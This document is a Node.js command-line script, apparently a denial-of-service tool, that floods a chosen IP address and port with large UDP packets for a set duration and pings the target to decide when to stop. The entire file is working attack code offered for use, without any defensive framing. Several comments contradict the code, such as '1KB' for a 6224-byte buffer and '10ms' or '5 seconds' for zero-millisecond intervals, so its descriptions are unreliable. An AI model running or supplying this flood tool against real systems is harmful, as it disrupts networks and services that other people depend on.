const dgram = require('dgram');
const ping = require('ping');
const process = require('process');

// Command-line arguments validation
if (process.argv.length !== 5) {
    console.log("Usage: node udpFlood.js <target-ip> <port> <duration>");
    process.exit(-1);
}

const targetIP = process.argv[2]; // Target IP address
const targetPort = process.argv[3]; // Target port
const duration = parseInt(process.argv[4]); // Duration of the attack in seconds

const message = Buffer.from('A'.repeat(6224)); // 1KB message for each UDP packet

let attackInterval; // Reference to interval for clearing later

// Function to initiate the UDP flood attack
function udpFlood() {
    const client = dgram.createSocket('udp4');
    
    attackInterval = setInterval(() => {
        // Send UDP packet to target IP and port
        client.send(message, 0, message.length, targetPort, targetIP, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            }
        });
    }, 0); // Send packets every 10ms
}

// Function to ping the target and stop the attack if a response is received
function pingKill() {
    const pingInterval = setInterval(() => {
        ping.sys.probe(targetIP, function(isAlive) {
            if (isAlive) {
                console.log(`Ping response received from ${targetIP}. Stopping the UDP flood attack.`);
                clearInterval(attackInterval);
                clearInterval(pingInterval);
                process.exit(0); // Exit the process after receiving the ping response
            } else {
                console.log(`No ping response from ${targetIP}. Continuing attack...`);
            }
        });
    }, 0); // Ping every 5 seconds
}

// Start the UDP Flood and Ping Kill
udpFlood();
pingKill();

// Log status
console.log(`\x1b[33m[\x1b[33m!\x1b[37m]\x1b[33m Starting UDP flood to ${targetIP}:${targetPort} for ${duration} seconds.`);

// Stop the flood after the specified duration
setTimeout(() => {
    console.log('\x1b[31m[!] Flood attack finished due to time limit!');
    clearInterval(attackInterval); // Stop the attack
    process.exit(0); // Exit after attack duration
}, duration * 1000); // Stop after the specified duration in seconds
